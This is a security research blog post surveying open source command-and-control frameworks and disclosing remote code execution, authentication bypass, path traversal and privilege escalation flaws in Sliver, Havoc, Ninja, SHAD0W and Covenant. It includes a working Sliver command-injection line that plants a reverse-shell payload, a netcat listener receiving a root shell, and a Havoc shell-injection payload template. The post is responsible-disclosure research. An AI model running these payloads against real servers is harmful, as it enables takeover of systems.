---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-09-18_vulnerabilities-in-open-source-c2-frameworks.md
original_filename: 2024-09-18_vulnerabilities-in-open-source-c2-frameworks.md
title: Vulnerabilities in Open Source C2 Frameworks
category: documents
detected_topics:
- command-injection
- access-control
- path-traversal
- supply-chain
- sso
- ssrf
tags:
- imported
- documents
- command-injection
- access-control
- path-traversal
- supply-chain
- sso
- ssrf
language: en
raw_sha256: a3841d7e8d7dc305a61ac73b0c987db3670c8d3225605468d7ac2462f5d45c5a
text_sha256: 0c7edc1742ca6fab07f07224cea1abac9ef1ad7794a7b25247605dc484fae57e
ingested_at: '2026-06-28T07:32:38Z'
sensitivity: unknown
redactions_applied: false
---

# Vulnerabilities in Open Source C2 Frameworks

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-09-18_vulnerabilities-in-open-source-c2-frameworks.md
- Source Type: markdown
- Detected Topics: command-injection, access-control, path-traversal, supply-chain, sso, ssrf
- Ingested At: 2026-06-28T07:32:38Z
- Redactions Applied: False
- Raw SHA256: `a3841d7e8d7dc305a61ac73b0c987db3670c8d3225605468d7ac2462f5d45c5a`
- Text SHA256: `0c7edc1742ca6fab07f07224cea1abac9ef1ad7794a7b25247605dc484fae57e`


## Content

---
title: "Vulnerabilities in Open Source C2 Frameworks"
page_title: "Vulnerabilities in Open Source C2 Frameworks - Include Security Research Blog"
url: "https://blog.includesecurity.com/2024/09/vulnerabilities-in-open-source-c2-frameworks/"
final_url: "https://blog.includesecurity.com/2024/09/vulnerabilities-in-open-source-c2-frameworks/"
authors: ["Laurence Tennant"]
programs: ["Bishop Fox (Sliver)", "Havoc", "Ninja C2", "SHAD0W", "Covenant"]
bugs: ["RCE", "OS command injection", "Authentication bypass", "Arbitrary file download", "Privilege escalation"]
publication_date: "2024-09-18"
added_date: "2024-09-24"
source: "pentester.land/writeups.json"
original_index: 0
---

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/redteam2.png?fit=864%2C486&ssl=1)

# Vulnerabilities in Open Source C2 Frameworks

October 30, 2024September 18, 2024 — Laurence Tennant

Application and source code security assessments are the primary focus of our work at Include Security, but sometimes network pentesting that uses software written by other hackers is needed. I decided to investigate open source Command & Control (C2) frameworks used in network and red teaming assessments to understand how they work, and ended up finding a fun mix of authenticated and unauthenticated RCE (remote code execution) vulnerabilities.

This post provides an overview of C2 concepts, gives a brief survey of current open source frameworks, and reviews the details of identified vulnerabilities (with reproduction gifs included!). The post concludes with some final thoughts about the current state of the C2 landscape and what future developments might look like.

## C2 Frameworks

Open source C2 frameworks have been getting a lot of attention in the past few years. The closed source Cobalt Strike has been the undisputed king of C2, but open source alternatives are seeing more usage among red teamers, threat actors, and hobbyists. Open source alternatives don’t have sky-high licensing costs, and have the potential to fly under the radar in a world where Cobalt Strike’s [default behaviors](https://www.thestack.technology/detecting-cobalt-strike/) are heavily profiled and fingerprinted.

A quick recap: a C2 framework is infrastructure used for controlling and maintaining access to hacked computers. C2 frameworks simplify the process for their “operators” (red teamers/pentesters/hackers) who are attacking a targeted network or organization. A term that is often associated with C2 frameworks is “post-exploitation”: C2 frameworks are designed to assist attackers who have already gained some level of control over a target’s computer, whether through phishing, web vulnerabilities, or supply chain attacks. The post-exploitation phase quickly becomes messy without a central management platform, especially for teams of operators collaborating together. C2 frameworks aim to solve that problem by packaging together three components: agent, teamserver, and client.

### Architecture

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/arch.jpeg?resize=830%2C342&ssl=1)

A C2 framework consists of the following three components:

  * Agent (also known as Implant/Demon/Beacon) – malware run on targeted systems that connects back to the teamserver, maintains access, and executes commands on the compromised system.
  * Teamserver – central backend service that receives call-backs from agents launched on hacked systems, and communicates with the agents. Has an API or some other interface to enable operators to interact with the teamserver and issue instructions to the agents.
  * Client – web interface or program run locally by the operator to connect to the teamserver, providing a UI to manage operations. In less mature C2 frameworks, the client may just be a command line interface (CLI) presented by the teamserver after it has started, rather than a separate component running on the operator’s own computer.

That description is the bare minimum that a C2 framework should do. Normally, an agent has features to avoid detection by antivirus and endpoint detection and response (EDR) products, together with modules to enumerate information about the compromised system and attack further systems. Likewise, a teamserver normally provides a suite of functionalities, including generating agent binaries for a range of target architectures and operating systems; managing files exfiltrated from targeted systems; implementing a range of transport protocols for agent-teamserver traffic to bypass firewall rules; and encrypting and authenticating the agent-teamserver traffic.

Additional terminology that is shared among C2 frameworks:

  * Loot – files, credentials, and screenshots downloaded/exfiltrated from compromised systems and stored on the teamserver
  * Listener – a port opened on the teamserver to listen for agent callbacks
  * Handler – backend code that executes on the teamserver in response to an agent callback, e.g. a handler could receive and download loot from the agent to the teamserver
  * Task – a queued operation that the operator wants an agent to perform
  * Beacon interval – a regular time period (e.g. every 30 seconds) that the agent waits in between checking into the teamserver listener to see if it has any tasks to perform. Done because it is stealthier than a persistent connection
  * Stager – a minimal piece of code executed on a compromised host that is designed to fetch and run a full C2 agent. It is stealthier and easier to deploy than a multi-megabyte agent
  * Stager listener – service running on the teamserver that delivers the full agent in response to a stager callback
  * Redirector – server that receives agent callbacks and forwards them to the teamserver. Aims to hide the teamserver’s IP address and make the agent-teamserver communications look like regular traffic

The following diagram shows typical usage of a C2 framework:

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/steps.jpeg?resize=1017%2C868&ssl=1)

## Open Source C2 Frameworks

Open source C2 frameworks each have a different feature-set, different UI, slightly different terminology, and are written in a variety of programming languages. However modern frameworks tend to fall into two camps: those written in Golang, and those written in C#. Golang and C# are both solid languages for all three components of the C2 stack, meaning the agent, teamserver, and client can be written in the same language. Python is also a popular choice for C2 teamserver and clients, while older C2 frameworks made heavy use of PowerShell for agents, from the era when it was easier to run malicious PowerShell code on Windows undetected.

Most C2 frameworks are passion projects started by individuals or small teams of contributors, and many once-popular frameworks are no longer under active development. There are resources that aim to make it easier to choose the right C2 framework such as the [C2Matrix questionnaire](https://ask.thec2matrix.com/), but several suggested frameworks were abandoned a long time ago. The most useful recent ranking I found was an [elimination tournament bracket](https://commoninja.site/atomics-on-a-friday) created by the [Atomics on a Friday podcast](https://www.youtube.com/watch?v=hEhQDmJ4Jx8) in April 2024. The voting saw Mythic, Sliver, and Havoc take the podium as the top community picks.

One interesting limitation of traditional C2 frameworks is that a framework bundles the agent, teamserver, and client together and each component is usually difficult to swap out. I found that some frameworks had fairly advanced agents, but had primitive control and collaboration code. Meanwhile, other C2 frameworks have a great UI, with operator role management, attack graphs, reactive frontend, but unsophisticated and unstealthy agents. This tight coupling of components is being addressed by modern modular frameworks which we’ll talk more about later.

## C2 Framework Threats

Operators use C2 frameworks to streamline management of complicated campaigns. C2 frameworks provide a way for multiple operators to co-ordinate when performing post-exploitation of targets. However, design flaws and bugs in the C2 frameworks can lead to security risks against the campaigns and the red team operators themselves.

Here are some of the possible threats against C2 frameworks:

Component| Threat| Example  
---|---|---  
Agent->Teamserver| An agent sends untrusted input to the teamserver, which results in unintended behavior such as arbitrary file write on the teamserver host| [CVE-2024-6127](https://aceresponder.com/blog/exploiting-empire-c2-framework)  
Agent->Operator| An agent sends untrusted input to the teamserver, which when viewed by an operator in the teamserver UI, leads to cross-site scripting or remote code execution| [CVE-2022-39197](https://securityintelligence.com/x-force/analysis-rce-vulnerability-cobalt-strike/)  
Operator->Teamserver| A low-privileged operator account (insider account, compromised credentials, or via another vulnerability) is able to gain remote code execution on the teamserver host| [CVE-2024-41111](https://github.com/BishopFox/sliver/security/advisories/GHSA-hc5w-gxxr-w8x8)  
Third Party->Agent| Lack of cryptographic authenticity from the agent enables a third party network attacker to take the role of the teamserver and hijack a red team campaign| [CVE-2023-34758](https://github.com/BishopFox/sliver/security/advisories/GHSA-8jxm-xp43-qh3q)  
Third Party->Teamserver| A bug or lack of rate-limiting makes it possible for an unauthenticated third party to deny service to the teamserver| [HavocExploit](https://github.com/syncwithali/HavocExploit)  
Third Party->Teamserver| An authentication flaw enables third parties to authenticate to the teamserver as operators or service accounts|  
  
## C2 Framework Vulnerabilities

With the background covered, let’s now look at individual C2 frameworks.

### Sliver

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/sliver.png?resize=971%2C731&ssl=1)

#### Sliver Intro

[Sliver](https://github.com/BishopFox/sliver) is a love letter to offensive Golang: the agent, teamserver, and client are all written in Go. Anyone who enjoys the Linux command line will feel at home with Sliver’s UI which is a CLI, although it’s also possible to write a [custom client](https://sliver.sh/docs?name=Custom+Clients). The architecture and code are high quality, with GRPC over mTLS for client-server communications and the option to use mTLS, Wireguard, HTTPS or DNS as the transport protocol for agent-server traffic.

I found Sliver’s agents (“implants”) to be powerful and reliable while pivoting and escalating privileges on HackTheBox ProLabs Active Directory networks. Sliver offers several methods to [execute third party tools](https://sliver.sh/docs?name=Third%20Party%20Tools), and the real magic of Sliver is the armory feature which offers a huge number of extensions, plus it’s easy to add your own. The agents also support running [beacon object files](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm) (BOFs), a position independent code format developed by Cobalt Strike, so Sliver gains access to the open source library of BOFs. For learning there’s an excellent [series of blog posts by Dominic Breuker](https://dominicbreuker.com/post/learning_sliver_c2_01_installation/).

#### Authenticated Command Injection

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/sliver_poc.gif?resize=1024%2C536&ssl=1)

While reviewing the stager code for the latest prerelease version of Sliver (1.6.0) I found a way for any Sliver operator (i.e. authenticated user) to get a root shell on the teamserver. This breaks Sliver’s threat model where “there is a [clear security boundary between the operator and server](https://github.com/BishopFox/sliver/issues/65), an operator should not inherently be able to run commands or code on the server.” Sliver has a multiplayer mode and is adding role-based access control to assign fine-grained privileges to operators. A red team operation usually consists of a number of individuals, and the compromise of one low-privileged team member should not lead to total administrative control over the server.

It’s also just a really fun vulnerability since we get the teamserver to pwn itself with Metasploit. We essentially execute a Metasploit stager payload on the server rather than sending it to the operator client to deploy on a target system. I reported this vulnerability to the Sliver team and it was fixed as [CVE-2024-41111](https://github.com/BishopFox/sliver/security/advisories/GHSA-hc5w-gxxr-w8x8) before it was released in a stable build.

Sliver has support for Metasploit stagers. Under the hood, the Metasploit stager calls `msfvenom` using Go’s `exec.Command()`. User options are validated before being interpolated into the command string. Last year a feature was added to provide advanced options to the stager. The intention behind the change was to control options such as `EXITFUNC=thread`, however the change allows additional command line arguments to be specified to `msfvenom`. One argument of `msfvenom` is `--out`, which writes the payload to a file rather than to standard output. This enables us to write the `msfvenom` payload to an arbitrary file on the teamserver.

We overwrite one of Sliver’s own bundled binaries at `/root/.sliver/go/bin/garble`:
  
  
  sliver > generate msf-stager --lhost 192.168.0.128 --lport 8888 --advanced --platform=linux&--payload=linux/x64/shell_reverse_tcp&--format=elf&--out=/root/.sliver/go/bin/garble
  
  [*] Sliver implant stager saved to: [...]

Setup a netcat shell on the attacking system 192.168.0.128 on port 8888. Then trigger the exploit by running an agent compilation command which indirectly executes `/root/.sliver/go/bin/garble`:
  
  
  sliver > generate beacon --mtls 1.2.3.4
  [*] Generating new windows/amd64 beacon implant binary (1m0s)
  [*] Symbol obfuscation is enabled
  та╝  Compiling, please wait ...

A root shell will pop:
  
  
  $ nc -lvp 8888
  Listening on 0.0.0.0 8888
  Connection received on 192.168.0.183 39238
  whoami
  root

The Sliver team remediated the vulnerability by removing the `generate msf-stager` command, and the documentation now instructs operators to generate their own Metasploit stagers locally rather than on the teamserver. The Sliver team were a pleasure to talk to, and sent a bottle of whiskey as part of their beverage-based bug bounty incentives.

### Havoc

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/havoc.jpeg?resize=1024%2C547&ssl=1)

#### Havoc Intro

[Havoc](https://github.com/HavocFramework/Havoc)‘s teamserver is also written in Go, but the client is C++ and has a Qt GUI, and the agent is written in C and ASM. The main advantage of Havoc over Sliver is the cool GUI, which resembles Cobalt Strike with the visualization of active sessions on hacked machines. I found Havoc’s code to be less mature than Sliver’s, with [sketchy stuff](https://github.com/HavocFramework/Havoc/blob/main/client/src/UserInterface/Widgets/Store.cc#L201) in a few places, although it is improving as the devs refactor the original codebase. The default Havoc agent (“demon”) has the ability to execute shellcode in remote processes using process injection, and execute BOF files via .NET inline assembly. Compared to Sliver there’s a smaller [extension library](https://p4p1.github.io/havoc-store/) with a little more overhead required to write an extension. Considering that Havoc was started as a hobby project by a teenage developer, it’s extremely impressive and has probably the best UI of any C2 framework.

#### Another Authenticated Command Injection

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/havoc_poc.gif?resize=1024%2C537&ssl=1)

Havoc has an authenticated RCE vulnerability in the teamserver that is similar to the one in Sliver. Further, the [default Havoc configuration](https://github.com/HavocFramework/Havoc/blob/main/profiles/havoc.yaotl#L12) creates two users with the password “password1234”, so anyone careless enough to run Havoc with default settings on an untrusted network can immediately be exploited by this RCE vulnerability. Teamservers that are firewalled off can still be hit due to a cool [SSRF vulnerability](https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/) discovered by chebuya recently.

An `exec.Command()` call is used to compile custom agents on behalf of users, and every client parameter is sanitized except one: the [“Service Name” field](https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/teamserver/pkg/common/builder/builder.go#L617). Because [`sh -c` is the program run](https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/teamserver/pkg/common/builder/builder.go#L1066), the compilation command can be cancelled and an arbitrary command can be run instead. The results can even be viewed in the Havoc UI although the whole attack can also be [automated](https://github.com/IncludeSecurity/c2-vulnerabilities/blob/main/havoc_auth_rce/havoc_rce.py) by speaking the teamserver’s WebSockets protocol.

An injection payload into the service name field looks something like `\" -mbla; CMD 1>&2 && false #`:

  * `\"` to exit out the quotes
  * `-mbla` to cause the MinGW compilation to fail and not have to wait for it
  * `CMD 1>&2` with the chosen payload redirected to stderr
  * `&& false` to cause the command to fail and the server to send back the stderr output
  * `#` to comment out the parameters after our injection

#### Service API Authentication Bypass

Some time before this, I also found an authentication bypass in Havoc’s Service API feature. The authentication logic loops through usernames and passwords, but [if none matched, then the function didn’t return false](https://github.com/HavocFramework/Havoc/blob/24816665671afd3cd2a5e1900a85555ac2c6fd1d/Teamserver/pkg/service/service.go#L112). This meant that a malicious service could connect to a teamserver, provide the wrong password, and just continue sending messages to the teamserver that the teamserver would treat as authorized.

The Service API code is separate from the user agent generation code, otherwise put together there could have been a full unauthenticated chain to root against the Havoc teamserver with these two vulnerabilities.

In response to the disclosure, the Havoc developer gave credit in Havoc’s release notes, added me to a private members/contributors channel, and invited me to find more bugs. The service API authentication bypass is fixed but the authenticated RCE is still present in the master branch of Havoc as all development effort is now focused on the [rewrite branch](https://github.com/HavocFramework/Havoc/tree/rewrite-1.0). 

### Ninja

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/ninja.png?resize=878%2C634&ssl=1)

#### Ninja Intro

I’d found authenticated RCEs in two popular open source C2 frameworks, but didn’t find a way to upgrade these into fully unauthenticated RCEs. For that I needed to look into lesser-known frameworks.

[Ninja C2](https://github.com/ahmedkhlief/Ninja) is based on the [leaked MuddyC3 code used by an Iranian APT group](https://shells.systems/introducing-ninja-c2-the-c2-built-for-stealth-red-team-operations/). The teamserver is written in Python and the agents use PowerShell. Its design goal is stealth, with a number of behaviors changing each time a new campaign is launched. For example, the teamserver generates obfuscated webserver callback URLs that change with each campaign. Many of the features of Sliver and Havoc are present albeit in a more basic form. The associated blog posts claims that when newly-released, Ninja was able to bypass major AV and SIEM products, showing that an unfamiliar attack signature is everything when it comes to stealth.

#### Unauthenticated Arbitrary File Download

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/ninja_poc.gif?resize=1024%2C533&ssl=1)

The Ninja webserver is vulnerable to unauthenticated arbitrary file download via path traversal. This leads to immediate RCE against the teamserver when it’s running as root, or RCE upon the next restart of the teamserver.

The preconditions of the vulnerability are the same as the [Skywalker](https://blog.harmj0y.net/empire/empire-fails/) exploit against the Empire framework from 2016, a classic C2 framework vulnerability that has its own [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/empire_skywalker.rb). The Skywalker exploit occurs when:

  1. The teamserver contains a download endpoint that an agent can call.
  2. The agent can provide the full filepath of the file it is uploading to the teamserver.
  3. The filepath parameter is vulnerable to path traversal.

Note that none of three preconditions are true for Sliver. In Sliver, downloads only occur when an operator requests them; the agent has no control over the filepath; and the filename is set by the client using the basename rather than the full path of the file.

In Ninja’s case, an agent also doesn’t require any special secret to register with the Ninja teamserver. A malicious fake agent can call the register endpoint, then upload a malicious file to an arbitrary filepath on the teamserver. The only speedbump is that URL endpoints are randomly picked from a list for each campaign, but [the endpoint list](https://github.com/ahmedkhlief/Ninja/blob/master/utils/links.txt) is short enough to be brute-forced. The exploit script implements this with a reverse shell callback in a crontab. 

I reached out several times to the Ninja developer but did not receive a response.

### SHAD0W

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/SHAD0W.png?resize=1024%2C746&ssl=1)

#### SHAD0W Intro

[SHAD0W](https://github.com/bats3c/shad0w) is a C2 framework with a Python backend and agents written in C. It was popular three years ago, but has not seen any further development since. The UI is a cool hacker CLI similar to Sliver. SHAD0W’s main feature is its modularity, with a clean codebase and straightforward protocol for adding new commands and modules. The other focus is stealth, with an agent that implements anti-DLL injection, dynamically resolved syscalls, and thread hijacking for process injection. I think it’s a shame that SHAD0W’s development stopped as I found it easier to jump in and understand the code for this framework compared to most others.

#### Unauthenticated RCE

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/shad0w_poc.gif?resize=1024%2C537&ssl=1)

SHAD0W is vulnerable to unauthenticated RCE where untrusted input provided by agents is injected into commands run on the teamserver. When a new agent (“beacon” in SHAD0W terminology) checks in to the teamserver, the beacon reports the architecture, operating system, domain and other information about the compromised system.

In SHAD0W, beacon modules are compiled on-demand on the teamserver for the target system. Several modules in SHAD0W use the arbitrary beacon-provided values as parameters when compiling shellcode. For instance, the `migrate` module which implements process migration, [passes the architecture value](https://github.com/bats3c/shad0w/blob/d35b9dc74319800bbab1678aba69258532ec0200/lib/commands/migrate.py#L62) to `buildtools.make_in_clone()`. The value is [eventually interpolated](https://github.com/bats3c/shad0w/blob/master/lib/buildtools.py#L152) into an `os.system()` function call for the `make` command.

The beacon-provided values are displayed to the C2 operator when the beacon first connects to the teamserver, so some level of obfuscation is required here to disguise the payload and spark the operator’s curiosity to interact with the beacon. When the operator interacts with the beacon and uses the `migrate` module, the attacker’s command executes on the teamserver.

I reached out several times to the SHAD0W developer but did not receive a response.

### Covenant

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/covenant.jpeg?resize=1024%2C682&ssl=1)

#### Covenant Intro

Covenant is another framework that was popular 3-4 years ago, and was the one chosen for the first iteration of Zero Point Security’s [Red Team Ops](https://training.zeropointsecurity.co.uk/courses/red-team-ops) course. The server is written in C# and the client is a C# Blazor webapp. Since then, the framework has seen little development. The framework has a number of neat features including a clean web UI, cryptographic forward secrecy for agent-server communication, and listener profiles for dynamically modifying the way that agent-server communication appears on the wire.

#### Escalation of Privilege

Both the current master and dev branches of Covenant are vulnerable to an escalation of privilege from User to Administrator. The API [blocks editing roles](https://github.com/cobbr/Covenant/blob/5decc3ccfab04e6e881ed00c9de649740dac8ad1/Covenant/Controllers/ApiControllers/CovenantUserApiController.cs#L298) unless you are an Administrator, however in the UI itself it’s [possible for a User to give themself the Administrator role](https://github.com/cobbr/Covenant/blob/5decc3ccfab04e6e881ed00c9de649740dac8ad1/Covenant/Components/CovenantUsers/EditCovenantUser.razor).

The user now has access to the most powerful feature of Covenant, the ability to create HTTP listener profiles, which is [restricted to Administrators](https://github.com/cobbr/Covenant/blob/5decc3ccfab04e6e881ed00c9de649740dac8ad1/Covenant/Core/CovenantService.cs#L3616). Although there is no built-in way to get a shell on a Covenant server, the HTTP profiles feature essentially enables running C# code on the server as a way of customizing traffic sent to and from agents.

#### Another Authenticated Command Injection

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/covenant_poc.gif?resize=1024%2C530&ssl=1)

The C# code is limited by the fact that the Covenant compiler [restricts the `System` namespace](https://github.com/cobbr/Covenant/blob/5decc3ccfab04e6e881ed00c9de649740dac8ad1/Covenant/Core/Common.cs#L85) to `System.Private.CoreLib.dll` which means `Process` can’t be directly used. However [previous cool research](https://web.archive.org/web/20220126104152/https://blog.null.farm/hunting-the-hunters) on Covenant by 0xcoastal found a [blog post by Tim Malcolmvetter](https://malcomvetter.medium.com/net-process-injection-1a1af00359bc) that showed that only the `Activator` and `Assembly` classes are required to perform process injection of arbitrary .NET assemblies. That research left writing the exploit proof of concept as an exercise for the reader, so I implemented an [attack script](https://github.com/IncludeSecurity/c2-vulnerabilities/blob/main/covenant_priv_esc_auth_rce/covenant_rce.py), completing the escalation from low privileged user to shell on the Covenant teamserver.

The Covenant developer acknowledged the escalation of privilege vulnerability and that it would be fixed next time he worked on Covenant. He asked for the following addendum to be included: “Network access to a Covenant listener is not sufficient for this vulnerability. This vulnerability requires logical access to Covenant’s management port, which should never be publicly exposed. This is an authenticated privilege escalation that requires access to a valid, existing user account. RCE on the Covenant server through the management interface as an Administative user via custom profiles is known and is intended functionality. Even though Covenant is not currently in active development, Covenant is still in beta (pre v1.0). Covenant is developed as a hobby and has never been professionally evaluated for security risks.”

### Mythic

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/09/mythic.png?resize=1024%2C534&ssl=1)

One popular C2 framework that is absent so far is [Mythic](https://github.com/its-a-feature/Mythic). Mythic is designed differently to most C2s in that it is a modular platform that must be customized as it doesn’t come with a built-in agent. Each part of the Mythic system has its own Docker container, and starting Mythic involves launching eight Docker containers by default (one for the webserver, one for the database, one for the GraphQL API etc), and then you add more containers for the particular agents and transports you want to use.

This has freed up Mythic to focus more on the architecture and the collaboration experience on the teamserver rather than building stealthy agents. The web UI does look a little dated on the surface, but once you start interacting with the server, it’s clear that Mythic has tons of teamserver functionality and quality-of-life features, more than any other C2 framework I looked at. The platform has full user and service account role management and enables launching campaigns involving different operators with several permission levels. Mythic is also advanced in terms of tracking everything that happens during a campaign, and the data is easily searchable in order to accelerate reporting.

From the quick code review I did, I didn’t spot any glaring flaws in Mythic’s API authentication and logic, nor any opportunities for RCE on the Mythic server. But Mythic was overkill for the HackTheBox labs I was doing so I didn’t dive deep into it. It looks great for larger operations and is currently more actively developed than any other open source C2 framework. I wonder if this is the future of open source C2 frameworks – a modular collaboration platform which you can easily plug your own agent into, or even develop your own API frontend for, rather than a tight coupling of agent, client, and teamserver components.

## Conclusion

Overall, in the course of this exploration I learned a few things. C2 frameworks are designed to help you run commands on other people’s computers, but ironically many C2 frameworks are vulnerable to having unauthorized commands run on them. In some cases, simply launching these frameworks with the default options on a public network (such as the HackTheBox VPN) leaves you open to RCE. I see this as important to highlight, as many users are hobbyists experimenting and playing CTFs with their buddies, and won’t be doing an advanced operational deployment of the teamservers.

The origin of the vulnerabilities is the complexity and number of roles that a teamserver is required to fulfill in C2 frameworks. The teamserver compiles exploits on behalf of operators, displays data from external untrusted IPs in the UI, and downloads files from hacked systems. Preventing these features from being exploited requires strictly validating any external input and minimizing the number of calls to `system()` functions. The C2 frameworks tested generally performed this validation, but made one oversight somewhere which meant the attacker input flowed into powerful sink functions. Frameworks have the best chance at avoiding such vulnerabilities by strongly enforcing data boundaries between agent, teamserver, and client. For example, see the comparison of Ninja vs Sliver’s approach to the Skywalker vulnerability preconditions (under the Ninja section above).

I was surprised at how many cool open source C2 frameworks are no longer maintained. Besides the usual constraints on open source developers’ time and interest, I wonder if there’s a cycle where new frameworks are hyped for being able to bypass Defender when they’re first released, but soon get signatures made for them. The state of the art moves forward quickly and the developer gets fed up with the amount of low effort issues that get sent their way. However, I expect there are plenty of active private forks out there of publicly dead frameworks. 

This is another reason why the “bring your own agent” model makes sense for open source C2 frameworks (as discussed in the Atomics on a Friday podcast). Cobalt Strike’s default transport and beacon behaviors are so heavily fingerprinted that they require substantial patching and customization to work in reasonably defended environments. As soon as open source C2 frameworks are released, their agents and transport protocols start to suffer the same fate. The client-facing part of the teamserver and the client itself are the components of the system that are least exposed. Making these unexposed components reliable/secure/feature-rich with the expectation that the operators develop their own closed source evasive agents and transports is a practical design decision.

Proof of concept vulnerabilities are released [here](https://github.com/IncludeSecurity/c2-vulnerabilities).

Artwork by [Caleb Nelson](https://www.instagram.com/sketchysketchy/)

### Share this:

  * [ Share on X (Opens in new window) X ](https://blog.includesecurity.com/2024/09/vulnerabilities-in-open-source-c2-frameworks/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://blog.includesecurity.com/2024/09/vulnerabilities-in-open-source-c2-frameworks/?share=facebook)
  * 

### Like this:

Like Loading…

Categories [Uncategorized](https://blog.includesecurity.com/category/uncategorized/) Tags [appsec](https://blog.includesecurity.com/tag/appsec/), [C2](https://blog.includesecurity.com/tag/c2/), [command and control](https://blog.includesecurity.com/tag/command-and-control/), [hacking](https://blog.includesecurity.com/tag/hacking/), [OWASP](https://blog.includesecurity.com/tag/owasp/), [red team](https://blog.includesecurity.com/tag/red-team/), [security research](https://blog.includesecurity.com/tag/security-research/), [vulnerabilities](https://blog.includesecurity.com/tag/vulnerabilities/), [webappsec](https://blog.includesecurity.com/tag/webappsec/) Post navigation

[Coverage Guided Fuzzing – Extending Instrumentation to Hunt Down Bugs Faster!](https://blog.includesecurity.com/2024/04/coverage-guided-fuzzing-extending-instrumentation/)

[Spelunking in Comments and Documentation for Security Footguns](https://blog.includesecurity.com/2024/11/spelunking-in-comments-and-documentation-for-security-footguns/)
